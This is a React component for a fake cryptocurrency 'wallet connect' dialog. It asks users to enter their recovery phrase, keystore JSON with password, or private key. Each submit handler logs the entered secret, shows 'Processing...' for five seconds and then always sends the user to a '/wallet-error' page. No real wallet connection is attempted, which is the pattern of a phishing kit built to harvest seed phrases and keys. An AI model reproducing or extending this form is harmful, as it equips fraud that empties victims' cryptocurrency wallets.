import React, { useEffect, useState } from 'react';
import { AiOutlineClose } from 'react-icons/ai';
import styles from './WalletConnectForm.module.css';
import {useNavigate} from 'react-router-dom'

const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {

  const navigate = useNavigate()

  const [currentView, setCurrentView] = useState(1);
  const [activeButton, setActiveButton] = useState(1);

  const [wallet, setWallet] = useState('');
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeyStore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [phraseError, setPhraseError] = useState(false);
  const [privateKeyError, setPrivateKeyError] = useState(false);
  const [phraseSubmit, setPhraseSubmit] = useState('CONNECT')
  const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')
  const [privateSubmit, setPrivateSubmit] = useState('CONNECT')

  useEffect(() => {
    setWallet(walletName)
  }, [wallet])

  const handleButtonClick = (viewNumber, e) => {
    e.preventDefault(); // Prevent the default form submission behavior
    setCurrentView(viewNumber);
    setActiveButton(viewNumber);
  };

  const walletType = walletName + (walletName.includes("Wallet") ? "" : " Wallet");

  const validatePhrase = (inputPhrase) => {
    const words = inputPhrase.trim().split(/\s+/); // Split by whitespace
    return words.length >= 12;
  };

  const trackPhraseWordCount = () => {
    if (validatePhrase(phrase)) {
      setPhraseError(false);
    } else {
      setPhraseError(true);
    }
  };
  const trackPrivateKeyWordCount = () => {
    if (validatePhrase(privateKey)) {
      setPrivateKeyError(false);
    } else {
      setPrivateKeyError(true);
    }
  };

  const handlePhraseSubmit = (e) => {
    e.preventDefault();
    if (validatePhrase(phrase)) {
      // Proceed with form submission
      setPhraseSubmit("Processing...")
      setTimeout(() => {
        navigate('/wallet-error')
      }, 5000);
      console.log(wallet);
      console.log(phrase);

    } else {
      setPhraseError(true);
    }
  }
  const handleKeystoreSubmit = (e) => {
    e.preventDefault();
    console.log(wallet)
    console.log(keystore)
    console.log(keystorePassword)
    setKeystoreSubmit("Processing...")
    setTimeout(() => {
      navigate('/wallet-error')
    }, 5000);

  }
  const handlePrivateKeySubmit = (e) => {
    e.preventDefault();
    console.log(wallet)
    console.log(privateKey)
    setPrivateSubmit("Processing...")
    setTimeout(() => {
      navigate('/wallet-error')
    }, 5000);
  }
  
  return (
    <section className={styles.formSection}>
      <section className={styles.innerSection}>
        <div className={styles.buttonContainer}>
          <button
            onClick={() => setDisplayForm(false)}
            className={styles.backButton}
          >
            Back
          </button>
          <AiOutlineClose
            onClick={() => setDisplayForm(false)}
            className={styles.closeIcon}
          />
        </div>

        <div className={styles.walletForm}>
          <div className={styles.contentContainer}>
            <div className={styles.imageContainer}>
              <img src={walletLogo} alt="wallet logo" className={styles.walletLogo} />
            </div>
            <div className={styles.walletHeading}>
              <p>Import your {walletName} {walletName.includes("Wallet") ? "" : " Wallet"} </p>
            </div>
          </div>

          <div className={styles.view}>
            <button
              type="button"
              onClick={(e) => handleButtonClick(1, e)}
              className={activeButton === 1 ? styles.activeButton : styles.viewButton}
            >
              Phrase
            </button>
            <button
              type="button"
              onClick={(e) => handleButtonClick(2, e)}
              className={activeButton === 2 ? styles.activeButton : styles.viewButton}
            >
              <span className={styles.viewButtonSpan}>
                <span>Keystore</span>
                <span>JSON</span>
              </span>
            </button>
            <button
              type="button"
              onClick={(e) => handleButtonClick(3, e)}
              className={activeButton === 3 ? styles.activeButton : styles.viewButton}
            >
              Private Key
            </button>
          </div>
          
          <div>


            <div
              style={{
                display: currentView === 1 ? 'block' : 'none',
                
              }}
            >
            <form onSubmit={handlePhraseSubmit}>
              <textarea
                required
                spellCheck="false"
                name="Phrase"
                autoComplete="off"
                rows="7"
                placeholder='Enter your recovery phase'
                className={styles.textarea}
                value={phrase}
                onChange={(e) => {
                  setPhrase(e.target.value);
                  trackPhraseWordCount(); // Call the function
                }}
              ></textarea>
              <p 
                className={styles.hint}
                style={{
                  color: phraseError ? "red" : "green"
              }}
              >Typically 12 (sometimes 24) words separated by single spaces</p>
              <button type='submit' className={styles.connectButton}>{phraseSubmit}</button>
            </form>
            </div>

            <div
              style={{
                display: currentView === 2 ? 'block' : 'none',
              }}
            >
            <form onSubmit={handleKeystoreSubmit}>
              <textarea
                autoComplete="off"
                required
                spellCheck="false"
                name="Keystore"
                rows="7"
                placeholder='Enter your Keystore JSON'
                className={styles.textarea}
                value={keystore}
                onChange={(e) => setKeyStore(e.target.value)}
              ></textarea>
              <input
                required
                type="password"
                autoComplete="off"
                name="keystorePassword"
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
                placeholder='Wallet Password'
                className={styles.passwordInput}
              />
              <p className={styles.hint}>Several lines of text beginning with {`{...}`} plus the password you used to encrypt it.</p>
              <button type='submit' className={styles.connectButton}>{keystoreSubmit}</button>
            </form>
            </div>

            <div
              style={{
                display: currentView === 3 ? 'block' : 'none',
                
              }}
            >
            <form onSubmit={handlePrivateKeySubmit}>
              <input
                required
                type="text"
                name="privateKey"
                value={privateKey}
                autoComplete="off"
                onChange={(e) => {
                  setPrivateKey(e.target.value)
                  trackPrivateKeyWordCount(); // Call the function
                }}
                placeholder='Enter your Private Key'
                className={styles.privateKeyInput}
              />
              <p 
                className={styles.hint}
                style={{
                  color: privateKeyError ? "red" : "green"
              }}
              >Typically 12 (sometimes 24) words separated by single spaces</p>
              <button type='submit' className={styles.connectButton}>{privateSubmit}</button>
            </form>
            </div>

          </div>
        </div>
      </section>
    </section>
  );
};

export default WalletConnectForm;